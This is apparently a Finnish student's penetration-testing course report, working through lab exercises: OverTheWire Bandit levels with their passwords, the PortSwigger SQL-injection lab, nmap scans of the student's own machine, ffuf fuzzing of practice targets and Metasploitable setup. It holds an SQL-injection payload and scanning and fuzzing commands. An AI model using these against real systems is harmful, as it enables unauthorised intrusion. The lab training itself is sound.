# PenTesting

# h0 - Alkutesti

Tero Karvisen nettisivujen alkusivulla on 23 requestia. Pyyntöjen aika vaihtelee melko paljon.  Lyhin aika on 3ms. favicon.ico pyyntö sai lyhyimmän vastausajan. Pisin taas on 122ms. Pisin vastaus oli pyyntöön terokarvinen.com. 
Vastaus terokarvinen.com pyyntöön on HTML. Headersissa näkyy, että kyseessä on GET pyyntö. Contentype pyynnössä on text/html. Pyynnön koko tavuina on 4637. Oli hieman teknisiä ongelmia, joten kirjoitin tämän raportin 12 minuutissa. Jäi aika lyhyeksi ajan vuoksi.

.

# h1

Tehtävän tekeminen alkaa alkaa 25.10.2023 klo 13:30.  Tein tehtäviä yhdessä kurssitoverini Alisa Ahokkaan kanssa. ALoitin tehtävien teon a kohdasta jätin x myöhemmäksi. X kohta eli tiivistelmä löytyy ihan läksyn lopusta. 

# a.)

# Level 0
Tehtävänanto:

The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.

Suoritus:

Annoin command prompt commandin ssh bandit0@bandit.labs.overthewire.org -p 2220 


<img width="796" alt="Screenshot 2023-10-25 at 13 41 06" src="https://github.com/AkiAleksi/h1/assets/112399816/35e42af5-adf4-449f-a35b-86d8351da70a">


Sen jälkeen annoin salasanan, joka oli annettu tehtäcän annossa eli bandit0.
<img width="603" alt="Screenshot 2023-10-25 at 13 41 15" src="https://github.com/AkiAleksi/h1/assets/112399816/731730d4-49a5-4a78-a19c-61a1d840ced7">


Kirjautuminen sisään onnistui.  



<img width="551" alt="Screenshot 2023-10-25 at 13 33 17" src="https://github.com/AkiAleksi/h1/assets/112399816/364ea0d8-9f74-4bfa-ad4e-cd0c516b0338">


Level 0 suoritettu.

# level 1

Tehtävänanto:

The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.

Suoritus:

Syötin ls komennon. Sen jälkeen cat readme. Sain vastaukseksi NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL.  Kokeilin syöttää salasanan ei toiminut.

<img width="762" alt="permission denied lvl1" src="https://github.com/AkiAleksi/h1/assets/112399816/a4ec0299-3187-4c0b-b4ab-06e66c7fdf96">






Annoin komennon exit. Sen jälkeen annoin komennon. ssh bandit1@bandit.labs.overthewire.org -p 2220. Syötin salasanan NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL. Pääsin kirjautumaan sisään. 


<img width="653" alt="Screenshot 2023-10-25 at 13 59 25" src="https://github.com/AkiAleksi/h1/assets/112399816/8af814d9-7a54-4123-b481-fd955fae12ef">

Level 1 suoritettu.

# Level 2
Tehtävänanto:

The password for the next level is stored in a file called - located in the home directory

Suoritus:

Ls komennolla sain vastaukseksi -. Kokeilin avata komennolla cat -. Ei toiminut. Googletin tiedon sivulta https://stackoverflow.com/questions/42187323/how-to-open-a-dashed-filename-using-terminal.
Piti siis avata cat < - komennolla. Sain vastaukseksi rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi. 

<img width="360" alt="level 2 kuva 1" src="https://github.com/AkiAleksi/h1/assets/112399816/98793787-3a4b-4af2-8d8d-ffb3edba7de5">



Annoin komennon exit. Komento ssh bandit2@bandit.labs.overthewire.org -p 2220. Sen jälkeen annoin salasanan rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi. 

<img width="712" alt="level 2 kuva 2" src="https://github.com/AkiAleksi/h1/assets/112399816/29ec60d2-29ce-47f0-841d-08702287b5b8">



Kirjauduin sisään onnistuneesti. 

<img width="824" alt="level 2 kuva 3" src="https://github.com/AkiAleksi/h1/assets/112399816/b9fcebbe-f193-402a-bcdf-e8f4220028e4">



Ratkaistu level 2.

a kohta ratkaistu.

# B.) 

Päätin suorittaa Challenge.fi ssä yhden tehtävän. Valitsin numeron 172. Tehtävän anto oli: "where was this picture taken".

<img width="652" alt="b kohta" src="https://github.com/AkiAleksi/h1/assets/112399816/3dfcf55d-02b0-4726-b9cd-baaaedf46f44">


Aukesi kuva eiffel tornista.

<img width="682" alt="Screenshot 2023-10-26 at 10 14 28" src="https://github.com/AkiAleksi/h1/assets/112399816/9938b0fe-8efb-464f-b4e2-8b34cbb05866">


Etsin kuvan tiedoista GPS. Siinä löytyi osoite missä kuva on otettu.

<img width="339" alt="Screenshot 2023-10-25 at 14 54 43" src="https://github.com/AkiAleksi/h1/assets/112399816/eebfe26d-14b7-433b-ac18-c0ca2fc6d821">


Oikea vastaus oli Las Vegas. Meni hetki keksiä, että kysyttiin kaupunkia eikä maata. Kurssitoverini keksi sen
nerokkaasti.

<img width="602" alt="B kohta ratkasiu" src="https://github.com/AkiAleksi/h1/assets/112399816/906cd1cd-de04-4e6a-aba1-e91ccc84b73e">



<img width="919" alt="Screenshot 2023-10-26 at 10 14 46" src="https://github.com/AkiAleksi/h1/assets/112399816/5790c1f4-4533-4b8c-8a7f-31b8439596d9">


B kohta suoritettu.

# C.)
Tehtävänanto:

Ratkaise PortSwigger Labs: Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data.

Suoritus:

Muutetaan urlia rikkomalla tietokantalause urlissa ‘OR+1+=1—  . 

<img width="1582" alt="Lab" src="https://github.com/AkiAleksi/h1/assets/112399816/d54bca98-bffc-4805-bba2-ca4beb013def">



<img width="547" alt="Screenshot 2023-10-25 at 15 22 12" src="https://github.com/AkiAleksi/h1/assets/112399816/cd39c95b-f144-4614-a9d1-24eca43b0060">

C ratkaistu.

Tehtävien teko sessioni päättyi 25.10.2023 klo 15:30.
Tehtävien teko jatkuu 26.10.2023 klo 10:43. Tällä kertaa yksin.

# d.)
Tehtävänanto:

Asenna Linux virtuaalikoneeseen. Suosittelen joko Kali (viimeisin versio) tai Debian 12-Bookworm.

Suoritus:

Latasin ja asensin Virtualboxin koneelleni. Latasin Kali Linux ISO tiedoston sen virallisilta nettisivuilta. Loin uuden virtuaalikoneen. Valitsin käyttöjärjestelmäksi Linux.  Sen jälkeen, kun virtuaalikone oli luotu menin virtuaalikoneen asetuksiin. Storage-välilehdeltä lisäsin Kali Linuxin ISO-tiedoston optinen asema kohdassa. Tallensin asetukset. Sen jälkeen käynnistin virtuaalikoneen.



<img width="850" alt="Screenshot 2023-10-26 at 11 42 43" src="https://github.com/AkiAleksi/h1/assets/112399816/1de66dfb-aa69-4ed9-acc6-24d077946fcf">




Sen jälkeen aloitin asennuksen. Tein kuitenkin pienen virheen asennusprosessin raportoinnin kannalta. Autocapturoin hiiren ja näppäimistön, joten en pystynyt ottamaan screenshotteja asennusprosessin aikana.


<img width="319" alt="Screenshot 2023-10-26 at 11 42 52" src="https://github.com/AkiAleksi/h1/assets/112399816/ac559b7c-caf1-4970-a0df-360986527980">


Asennus onnistui kuitenkin muuten hyvin. Löysin netistä ohjeet asennukseen screenshotteina. seurasin ohjeita. https://www.kali.org/docs/installation/hard-disk-install/


<img width="1259" alt="Screenshot 2023-10-26 at 13 19 03" src="https://github.com/AkiAleksi/h1/assets/112399816/acd5e945-d436-4cce-9ef7-24d80a068399">


<img width="403" alt="Screenshot 2023-10-26 at 13 14 40" src="https://github.com/AkiAleksi/h1/assets/112399816/8154f6f8-c131-4eaf-b676-5682cd8275c9">

Kokeilin kirjautua sisään ja se onnistui.


<img width="405" alt="Screenshot 2023-10-26 at 13 02 32" src="https://github.com/AkiAleksi/h1/assets/112399816/4c632d63-42a9-47ff-a9b6-3a9fb6dc3d99">


Kohta d ratkaistu.

# e.)

Tehtävänanto:
Porttiskannaa 1000 tavallisinta tcp-porttia omasta koneestasi (localhost). Analysoi tulokset. 

Suoritus:
Avasin terminaalin Kali Linuxissa. Ajoin komennon nmap -p 1-1000 "oma ip-osoite". Löysin tietoa nmap komennoista sivulta.
https://subscription.packtpub.com/book/security/9781783289592/4/ch04lvl1sec33/finding-open-ports


<img width="331" alt="Screenshot 2023-10-26 at 14 00 53" src="https://github.com/AkiAleksi/h1/assets/112399816/ce778548-054d-429d-aa84-d3fbe649102a">

Sain vastaukseksi. Not shown: 1000 closed tcp ports (conn-refused). Skannaukseni havaitsi siis 1000 suljettua TCP-porttia. Niihin yritettiin muodostaa yhteys. Yhteyspyyntö kuitenkin hylättiin. Tulos osoittaa, että portit joihin ei saatu yhteyttä ovat suljettuja. Niiden kautta ei voi hyökkäystarkoituksessa muodostaa yhteyksiä. Se suojelee tietokonetta ulkopuolisilta hyökkäyksiltä. 

Kohta e suoritettu.

# f.)
Tehtävänanto:
Porttiskannaa kaikki koneesi (localhost) tcp-portit. Analysoi tulokset. (Edellisissä kohdissa mainittuja analyyseja ei tarvitse toistaa, voit vain viitata niihin ja keskittyä eroihin).

Suoritus:

Ajoin Kali Linuxissa komennon nmap -p- "oma IP-osoite". Sama lähde kuin kohdassa e.

<img width="372" alt="TCP kaikki" src="https://github.com/AkiAleksi/h1/assets/112399816/8b1453a6-d239-4e75-8f0a-06f4c14f0614">

Nyt minulla näkyy avoimia portteja. Se tarkoittaa, että portit ovat kuuntelevia yhteyksiä. Joku ohjelma, palvelu tai prosessi käyttää niitä. Esimerkiksi minulla näyttäisi olevan MySQL-tietokantapalvelin käytössä. Joissain porteissa näkyy filtered. Kyseinen portti ei vastaa skannausyrityksiin. Se tarkoittaa, että portin tila ei ole avoin eikä suljettu vaan suodatettu. Syynä tälle voisi olla palomuuri tai verkkosuodatus. Joissain porteissa esiintyvä "unknown" taas viittaa siihen, että nmap ei pysty määrittelemään portin tarkkaa sovellusta tai palvelua sen vastauksen perusteella. Avoimet portit voivat olla tietoturvariski, jos ei ole tietoinen avoimista porteista ja niiden palveluiden tietoturva-aukoista.

# g.)
Tehtävänanto:

Tee laaja porttiskanaus (nmap -A) omalle koneellesi (localhost), kaikki portit. Selitä, mitä -A tekee. Analysoi tulokset. (Edellisissä kohdissa mainittuja analyyseja ei tarvitse toistaa, voit vain viitata niihin ja keskittyä eroihin.).

Suoritus:

Lähteen https://www.codecademy.com/resources/docs/cybersecurity/nmap/aggressive-scan mukaan nmap -A on laaja skannaus. Se tarjoaa paljon tarkempaa tietoa kuin normaali skannaus. Se suorittaa porttiskannauksen, palvelutunnistuksen, käyttöjärjestelmän tunnistuksen ja suorittaa erilaisia skriptejä. Syötin Kali Linuxin terminaaliin komennon nmap -A "oma IP-osoite".

<img width="362" alt="Nmap -A 1" src="https://github.com/AkiAleksi/h1/assets/112399816/aeeb44dc-d956-48df-80f4-fd58df9cb4bf">

<img width="430" alt="nmap-A 2" src="https://github.com/AkiAleksi/h1/assets/112399816/f43d596f-b1d6-4bf3-93b0-9d8c9242dec8">


Näkyvä tieto on nyt paljon laajempaa. 

Kohta g ratkaistu.

# h.)
Tehtävänanto:

Asenna ja käynnistä jokin palvelin (apache, ssh...) koneellesi. Vertaile, miten porttiskannauksen tulos eroaa.

Suoritus:

Minulla oli ollut tehtävän tekemisen aikana johtuen toisesta tehtävästä MySQL-palvelin päällä. 
Se siis näkyi aikaiseemin porttiskannauksessa. Sammutin sen. 

<img width="512" alt="sammuta" src="https://github.com/AkiAleksi/h1/assets/112399816/e111b765-cedf-4c09-9885-953e141cb101">

Sen jälkeen ajoin komennon nmap -p- "Oma IP-osoite".


<img width="366" alt="mysqlpois" src="https://github.com/AkiAleksi/h1/assets/112399816/3e6c67db-c264-420f-84aa-42f0f5deeba6">

Vastauksessa ei näkynyt mysql palvelinta. Sen jälkeen käynnistin MySQL-palvelimen. 


<img width="492" alt="startmysgl" src="https://github.com/AkiAleksi/h1/assets/112399816/85a5b7a3-ea6b-413a-8af1-11477a2e1e72">

Sen jälkeen ajoin komennon nmap -p- "Oma IP-osoite".


<img width="504" alt="mysqlpäällä" src="https://github.com/AkiAleksi/h1/assets/112399816/5be086cb-fd91-4495-9033-84cf72180e44">

MySQL-palvelimen TCP portti 3306 näkyy porttiskannauksessa. 

Kohta h suoritettu.

Tehtävien teko sessioni päättyi 26.10.2023 klo 16:03. Tehtävien teko jatkuu 27.10.2023 klo 11:30.

# i.)
Tehtävänanto:

Kokeile ja esittele jokin avointen lähteiden tiedusteluun sopiva weppisivu tai työkalu. Hyviä esimerkkejä löytyy Bazzel: IntelTechniques: Tools ja Bellingcat: Resources, voit myös käyttää muuta itse valitsemaasi työkalua. Työkalua pitää siis myös kokeilla, pelkkä nimen mainitseminen ei riitä. Pidä esimerkit harmittomina, älä julkaise kenenkään henkilökohtaisia salaisuuksia raportissasi.

Suoritus:

Bellingcat on itsenäisten tutkijoiden, etsivien ja kansalaisjournalistien yhteisö, joka tutkii avointa lähdekoodia.  Se on perustettu vuonna 2014. He ovat tutkineet avoimen lähdekoodin 
menetelmiä käyttäen yleistä kiinnostusta herättäviä aiheita. Kuten vaikka poliisi väkivaltaa Kolumbiassa. He myös julkaisevat ohjeita avoimen lähdekoodin tutkimusmenetelmistä. Sivustolla on julkaistu artikkeleita,
jossa on tutkittu avointa lähdekoodia. Sivustolta löytyy esimerkiksi Charlotte Maherin artikkeli: "Separating Fact from Fiction on Social Media in Times of Conflict"(26.10.2023.), jossa on avoimen 
lähdekoodin esimerkkien avulla osoitettu miten konfliktien aikana voi erottaa sosiaalisessa mediassa levitettävän disinformaation faktoista. 

# X.)
Tehtävänanto:
Lue/katso ja tiivistä. (Tässä x-alakohdassa ei tarvitse tehdä testejä tietokoneella, vain lukeminen tai kuunteleminen ja tiivistelmä riittää. Tiivistämiseen riittää muutama ranskalainen viiva.)

Suoritus:

Tehtävänannossa annettu video oli maksullinen. En saanut sitä toimimaan ilmaiseksi, joten tein tiivistelmän tekstistä Hutchins et al 2011: Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains, chapters Abstract, 3.2 Intrusion Kill Chain. 

Tiivistelmä:

-Niin kauan kun tietoverkkoja on ollut olemassa. On ollut myös pahantahtoisia henkilöitä, jotka tahtovat hyväksikäyttää heikkouksia. 

-APT (Advanced Persistent Threat) on pitkäaikainen ja edistynyt tietoturvauhka. Se pyrkii huomaamattomasti tunkeutumaan pitkäkestoisesti
tietoverkkoihin varastaakseen arkaluonteista tietoa. 

-Kill chain tarkoittaa tietoturvassa hyökkääjän systemaattista vaiheittaista prosessia. Siinä hyödynnetään haavoittuvuuksia, toimitaan sisäverkossa ja ylläpidetään pääsyä, jotta päämäärä saavutetaan. Sitä käytetään puolustustekniikoiden kehittämisessä hyökkäysten havaitsemiseksi ja estämiseksi.

-Monissa eri yhteyksissä. Esimerkiksi puolustuksen ja vastatoimien suunnittelussa sekä tietoturvassa, käytetään vaihepohjaisia malleja, kuten kill chain -mallia. Sitä käytetään hyökkäysten 
analysoimiseen ja vastatoimien kehittämiseen.

-Intelligence-driven computer network defense on riskienhallintastrategia. Se käsittelee uhkaa riskissä
ja sisältää analyysin hyökkääjistä. Heidän kyvyistään, tavoitteistaan, opeistaan sekä rajoituksistaan. Se on jatkuva prosessi.

-Paperissa esitellään kill chain tunkeutumista varten. Tunkeutumis kill chain antaa rakenteen hyökkäysten analysointiin, indikaattoreiden tunnistamiseen sekä puolustustoimien ohjaamiseen. 

-Intelligence-driven computer network defense on välltämätöntä APT uhkien valossa. 

Sain tehtävät tehtyä 27.10.2023 klo 16:14.

# Lähteet

https://www.kali.org/docs/installation/hard-disk-install/

https://www.bellingcat.com/category/resources/

https://subscription.packtpub.com/book/security/9781783289592/4/ch04lvl1sec33/finding-open-ports

https://www.codecademy.com/resources/docs/cybersecurity/nmap/aggressive-scan

https://www.bellingcat.com/resources/how-tos/2023/10/26/separating-fact-from-fiction-on-social-media-in-times-of-conflict/

https://stackoverflow.com/questions/42187323/how-to-open-a-dashed-filename-using-terminal

# h2

Tehtävien tekeminen alkaa 31.10.2023 klo 21.51.

# x
Videomateriaali:

Hoikkala "joohoi" 2020: Still Fuzzing Faster (U fool). In HelSec Virtual meetup #1. (about 1 hour)

Tiivistelmä:

-web fuzzer on tietoturvatyökalu

-Fuzzing on menetelmä, jossa syötetään suuri määrä satunnaista dataa 
,jotta voidaan tarkkailla järjestelmän reagointia tälläiseen syötteeseen.

-Web-fuzzerit toimivat usein HTTP-protokollan päällä ja lähettävät HTTP-pyyntöjä sovelluksen eri osiin satunnaisesti muokatuilla tai manipuloiduilla syötteillä.

-Fuff on joohoi:n luoma web fuzzer

-Fuff tarvitsee sanakirjan. Esim. Yleiset verkkopolkuosoitteet.

-fuff korvaa kohde url:sta FUZZ kohdan sanakirjasta tuleville sanoilla.

-ffuf vastauksia voi filtteröidä.

# a.)

Tehtävänanto:

Can you find two URLs: Admin page and Version control related page

Seurasin ohjeita ja latasin harjoitusmaalin dirfutz-1 niiden mukaan.
Laitoin harjoitusmaalin käyntiin. Asensin myös ffuf ja common.txt.

<img width="653" alt="dirfutz" src="https://github.com/AkiAleksi/h2/assets/112399816/e657c1fb-e418-4eee-8429-1324ae888d92">

Ajoin komennon. $ ./ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ

<img width="338" alt="eka komento" src="https://github.com/AkiAleksi/h2/assets/112399816/53a54c8d-b1d7-4c71-ba56-63e931469c8e">

Tutkin epähaluttujen vastausten yhteisiä piirteitä. Vaikuttaisi, että niiden koko on 154 bittiä.
Filtteröin sillä. 


<img width="388" alt="tulos" src="https://github.com/AkiAleksi/h2/assets/112399816/feeb79a7-e278-4498-881c-147ad088c811">

Annoin komennon $ ./ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ -fs 154.

<img width="428" alt="tulokset" src="https://github.com/AkiAleksi/h2/assets/112399816/4969fcf8-040c-4637-a267-e3355927c0bd">

Sain päätteet wp-admin ja .git. Kokeilin päätteitä.


<img width="796" alt="vastausa1" src="https://github.com/AkiAleksi/h2/assets/112399816/8e4a4c32-a2f8-4f78-8ce9-ef94dd0d6bc5">



<img width="586" alt="vastausa2" src="https://github.com/AkiAleksi/h2/assets/112399816/d83715da-8337-4291-8456-fc3d641f13b3">


Tehtävä ratkaistu

Tehtävien teko sessio päättyi 31.10.2023 klo klo 22:30. Tehtävien teko jatkuu 1.11.2023 klo 19:00.

# b.)

Ffufme harjoitusmaali asennettu

<img width="132" alt="asennus" src="https://github.com/AkiAleksi/h2/assets/112399816/51204403-f8d9-484d-8de7-be8ccd11f8f7">

# Basic content disvovery

Ajoin komennon ffuf -w ~/words/common.txt -u http://ffuf.me/cd/basic/FUZZ. Pitäis löytyä class ja development.log.


<img width="394" alt="eka" src="https://github.com/AkiAleksi/h2/assets/112399816/90cb62ac-b80f-41bd-9b34-dad05b839800">


class ja development.log tiedostot löytyi.

# Content Discovery With Recursion

Ajoin komennon ffuf -w ~/words/common.txt -recursion -u http://ffuf.me/cd/recursion/FUZZ
Pitäisi löytyä /admin, /admin/users ja /admin/users/96

<img width="373" alt="toka" src="https://github.com/AkiAleksi/h2/assets/112399816/40680b0b-c344-41a3-acc9-a48a3295e459">

Löytyi!

# Content Discovery With File Extensions

Ajoin komennon ffuf -w ~/wordlists/common.txt -e .log -u http://ffuf.me/cd/ext/logs/FUZZ.
Pitäisi löytyä /logs/users.log

<img width="339" alt="kolme" src="https://github.com/AkiAleksi/h2/assets/112399816/fd428172-e33a-4d28-8f96-78d437fa055c">

Löytyi!

# No 404 status

Ajoin ensin komennon ffuf -w ~/words/common.txt -u http://ffuf.me/cd/no404/FUZZ.
Sen jälkeen filtteröin 669 bitillä. 

<img width="404" alt="4" src="https://github.com/AkiAleksi/h2/assets/112399816/a57b1dea-7953-47ed-9874-9daf505230af">







<img width="400" alt="5" src="https://github.com/AkiAleksi/h2/assets/112399816/8e0233ed-2989-4c6c-8f7e-54e070553c8f">

Sain halutun vastauksen secret.


# Param Mining

Ajoin komennon ffuf -w ~/words/parameters.txt -u http://ffuf.me/cd/param/data?FUZZ=1

<img width="411" alt="6" src="https://github.com/AkiAleksi/h2/assets/112399816/f5be78dd-ab45-4bfc-a2a4-0c363f853339">

Löysin puuttuvan parametrin debug.

# Rate Limited

Ajoin komennon: ffuf -w ~/wordlists/common.txt -u http://ffuf.test/cd/rate/FUZZ -mc 200,429

Komennon ei ollut tarkoituskaan toimia. Sain erroreita enkä löytänyt oraclea.

Sen jälkeen ajoin komennon: ffuf -w ~/words/common.txt -t 5 -p 0.1 -u http://ffuf.test/cd/rate/FUZZ -mc 200,429


<img width="476" alt="fail1" src="https://github.com/AkiAleksi/h2/assets/112399816/80c292fe-0b87-4552-bfd2-ec26c7fe1424">

Sain saman vastauksen kuin aikaisemminkin. Errorit tulevat yhä edelleen eikä oraclea löydy.
En saanut tätä komentoa toimimaan valitettavasti, vaikka yritin pitkään. Tämä kohta jäi valitettavasti ratkaisematta.

1.11.2023 klo 20:27. 2.11.2023 klo 11:34.

# c.)

Porttiskannasin oman koneeni.
nmap TCP connect scan -sT "Oma ip-osoite"

<img width="498" alt="nmap" src="https://github.com/AkiAleksi/h2/assets/112399816/a3f5c2ee-8f8c-4293-92d1-de0db16c23e0">

sieppasin liikenteen wiresharkilla. Mysql palvelin, joka on päällä portissa 3306 näkyy sieppauksessa.
Portti vastaa. Se on auki.

<img width="1078" alt="scan mysql" src="https://github.com/AkiAleksi/h2/assets/112399816/1b67151f-7e68-4af8-b2b4-0b1e7f68113b">


Sieppauksessa näkyy kiinni olevat portit. Yritetty ottaa yhteys, mutta ei vastausta.


<img width="1030" alt="scan general" src="https://github.com/AkiAleksi/h2/assets/112399816/6d593019-2ec1-4d6b-a4e5-edfac168393d">


Tehtävien teko sessio päättyi 2.11.2023 klo 11:44. Tehtävien teko jatkuu 2.11.2023 klo 15:49

# d.)

nmap -Ss "oma IP-osoite". (Stealth Scan)


<img width="510" alt="ss" src="https://github.com/AkiAleksi/h2/assets/112399816/6e03d288-15a4-4a2d-8230-1651552a9eb8">

Lähettää SYN-paketteja portteihin. Kiinni olevat portit eivät vastaa.

<img width="1065" alt="nod" src="https://github.com/AkiAleksi/h2/assets/112399816/ca364b5f-fde7-4159-9ada-46be91725798">



# e.)
nmap -sn <kohde>

<img width="590" alt="onni2" src="https://github.com/AkiAleksi/h2/assets/112399816/0bc906dd-01c3-4ba3-85a1-85c9f16da275">

Komento nmap -sn <kohde> lähettää ping-pyynnöt määritettyyn kohdeosoitteeseen. Nmap sai vastauksen ping-pyynnöistä, se merkitsi koneen eläväksi (1 host up). 

<img width="1102" alt="onni" src="https://github.com/AkiAleksi/h2/assets/112399816/f20702a3-69a6-447a-bb4b-e9118a6ff7ef">




# f.)

nmap -Pn komento poistaa Nmapin oletustoiminnon, joka yrittää määrittää, ovatko tietokoneet tai laitteet verkossa ennen skannaamista.
Sieppauksessa näkyy nmap -Pn <kohde> tulokset.

<img width="1054" alt="-Pn" src="https://github.com/AkiAleksi/h2/assets/112399816/b27db739-661c-4e86-9742-2465e661e045">


<img width="1130" alt="-Pn common" src="https://github.com/AkiAleksi/h2/assets/112399816/87f62ea1-349b-45b5-90d1-382d701b264e">



# g.)

Ajoin ensin nmap -sV. Sen jälkeen tein sieppauksen. 

<img width="602" alt="palvelinversio" src="https://github.com/AkiAleksi/h2/assets/112399816/e1afa539-02f1-43aa-ac4c-436df7c31ace">

Palvelin käyttää AirTunes rtspd -ohjelmistoa ja sen versio on 690.7.1. Tieto löytyy sekä portista 5000 että portista 7000. Molemmat ovat avoinna RTSP-palvelulle.


<img width="1162" alt="palvelin2" src="https://github.com/AkiAleksi/h2/assets/112399816/a5832d49-bcbe-4a29-b314-53fc6dc6a13d">



# h.)

Ajoin komennon nmap output files -oA foo. 
Sillä sain kolme tiedosto tyyppiä foo.nmap, foo.gnamp ja foo.xml.

 foo.nmap
 Nopea tarkistus skannauksen tuloksista ja yleinen ymmärrys avoimista porteista ja palveluista.
 
<img width="677" alt="Screenshot 2023-11-03 at 18 12 56" src="https://github.com/AkiAleksi/h2/assets/112399816/8e0703ee-5583-4d4c-bf7e-cf02104b675d">


 foo.gnamp
 Automaattinen tietojen käsittely ja analyysi skripteissä tai ohjelmissa.
 
<img width="745" alt="foo gnamp" src="https://github.com/AkiAleksi/h2/assets/112399816/29713cbb-8a03-4c0f-a7e5-4e51aa4ae197">


foo.xml
Tarkempi analyysi ja tietojen käsittely ohjelmissa, joissa XML-tiedot voidaan jäsentää ja käsitellä automaattisesti.



<img width="1680" alt="foo" src="https://github.com/AkiAleksi/h2/assets/112399816/92853de6-4aa3-46b3-99d0-9b078223b391">




# i.)

<img width="676" alt="Screenshot 2023-11-02 at 17 45 52" src="https://github.com/AkiAleksi/h2/assets/112399816/0f1df28d-2736-4d1b-b9fd-42e2c4a1369a">

Käytin ajonaikaisia toimintoja
Tässä komennossa on -vv-näppäin. Se kertoo paljon yksityiskohtia skannauksesta. -sS-näppäin määrittelee SYN-skannauksen, joka on yksi Nmapin perusskannausmenetelmistä. -Pn-näppäin ohittaa ping-skannauksen ja mahdollistaa skannauksen vaikka kohde ei vastaisi ping-pyyntöihin. Lähde chatGPT: https://chat.openai.com/auth/login

# j.)

nmap skannauksessa yritetään selvittää,
mitkä portit ovat auki palvelimella.
Sieppauksessa näkyy useita peräkkäisiä porttipyyntöjä samasta lähteestä.
Se on merkki skannauksesta. Todistin näin, että nmap skannaus on helposti havaittavissa.

<img width="1183" alt="piilo" src="https://github.com/AkiAleksi/h2/assets/112399816/5036a13d-3b32-4f39-909a-78db2207182c">

nmap skannauksen piilottaminen on siis haasteellista.

# k.)
Ajoin nmap -sU <Oma IP osoite>


<img width="600" alt="Screenshot 2023-11-02 at 17 56 33" src="https://github.com/AkiAleksi/h2/assets/112399816/122ae0da-c6e4-482d-93bc-92a9aa7c8e80">

vastauksessa näkyy UDP-paketteja, jotka on lähetetty tiettyihin portteihin.
Pyritään selvittämään, ovatko ne avoinna vai suljettuja.

<img width="1204" alt="kokk" src="https://github.com/AkiAleksi/h2/assets/112399816/f4933ff8-ec9f-4e35-8c67-23df7211dc5a">



<img width="1069" alt="Screenshot 2023-11-02 at 17 58 05" src="https://github.com/AkiAleksi/h2/assets/112399816/38fbb8b8-2f3c-47ab-a71b-411a5e7c0313">

# l.)
Lähde https://windowsbulletin.com/fi/suorita-verkkoporttiskannaus-porttiskannerilla/

UDP ei vaadi yhteyden muodostamista ja on epäluotettava. 
Tiedot lähetetään määräpaikasta riippumatta. Siksi ei ole takeita siitä, että tiedot pääsevät sinne.


Tehtävät tehty 2.11.2023 klo 18:10.

# Lähteet

https://windowsbulletin.com/fi/suorita-verkkoporttiskannaus-porttiskannerilla/

https://chat.openai.com/auth/login

Hoikkala "joohoi" 2020: Still Fuzzing Faster (U fool). In HelSec Virtual meetup #1.

# h3
Tehtävien teko alkaa 8.11.2023 klo 9:48

# x

Velu 2022: Mastering Kali Linux for Advanced Penetration Testing 4ed: Chapter 10 - Exploitation: kappaleet "The Metasploit Framework", "The exploitation of targets using Metasploit" ja "Using public exploits". Eli ei enää kappaletta "Developing a Windows exploit" ja siitä eteenpäin.

Tiivistelmä:

 -Metasploit Framework (MSF) on avoimen lähdekoodin työkalu. Se on
 suunniteltu helpottamaan tunkeutumistestauksen suorittamista.

 -MSF on kirjoitettu Ruby-ohjelmointikielellä. 

 -Käyttää modulaarista lähestymistapaa helpottamaan 
 hyökkäyksiä hyödyntämisvaiheessa kyberhyökkäysten ketjumenetelmässä.
 
 -Frameworkki voidaan jakaa kolmeen pääosaan: Libraries, Interfaces ja Modules.

 -MSF (Metasploit Framework) on yhtä tehokas sekä käyttöjärjestelmän haavoittuvuuksia että kolmannen osapuolen sovelluksia vastaan. 

 

  # Vapaavalintainen läpikävely:

  Katsoin: https://www.youtube.com/watch?v=Ul9WmUY49oM

  

  # Nyrkeilysäkki. Eli piti etsiä kotitehtävä raportti. 
  Jossa Kali ja Metasploitable on asennettu samaan verkkooon VirtualBoxiin,
  sekä testaamalla osoitettu, että koneet on saatu irti Internetistä.

  Kotitehtävä raportti:
  https://kulonpaa.com/?p=87

  
  
# a.)

Minulla oli jo valmiiksi Kali Linux asennettuna virtuaalikoneeseen.

<img width="831" alt="Screenshot 2023-11-07 at 12 35 24" src="https://github.com/AkiAleksi/h3/assets/112399816/750a597a-cc04-405c-bd5a-98f2924e00b8">

# b.)

Asensin metasploitable 2 virtuaalikoneeseen.
Seurasin näitä ohjeita: https://www.geeksforgeeks.org/how-to-install-metasploitable-2-in-virtualbox/

<img width="785" alt="Screenshot 2023-11-07 at 12 57 11" src="https://github.com/AkiAleksi/h3/assets/112399816/bbd7ab80-b2d8-494b-b052-0d9b4bb34ae6">

Tehtävien teko sessio päättyi 8.11.2023 klo 10:30. Tehtävien teko jatkuu 9.11.2023 klo 9:30.

# c.)

Laitoin kalin asetuksista network adapterit sopiviksi.
Adapter 1 NAT ja adapter 2 host only network.

<img width="604" alt="adapter1" src="https://github.com/AkiAleksi/h3/assets/112399816/042d59c0-2250-4684-8e36-256e81f22942">

<img width="576" alt="adapter2" src="https://github.com/AkiAleksi/h3/assets/112399816/21b1ac4b-7ebf-4c98-82c5-b3e1c8dc8c10">

Laitoin metaportable 2 asetukset myös.
Tässä vain only host network adapter 1.

<img width="703" alt="Screenshot 2023-11-08 at 14 30 45" src="https://github.com/AkiAleksi/h3/assets/112399816/2b266ce7-ff3c-49dd-a8d8-7be5e42fdc55">

Ajoin ifconfig metaportable 2. inet addr: 192.168.56.3


<img width="357" alt="ip" src="https://github.com/AkiAleksi/h3/assets/112399816/ec302910-4e3a-4b1e-a7a1-829bc36d69f4">

Ajoin ping 192.168.56.3. Ping vastaa!

<img width="208" alt="Screenshot 2023-11-08 at 14 11 47" src="https://github.com/AkiAleksi/h3/assets/112399816/ee1d3a91-6a17-424b-ae5f-846f867d2142">


Ajoin komennon curl www.google.com. Internet yhteys katkeaa


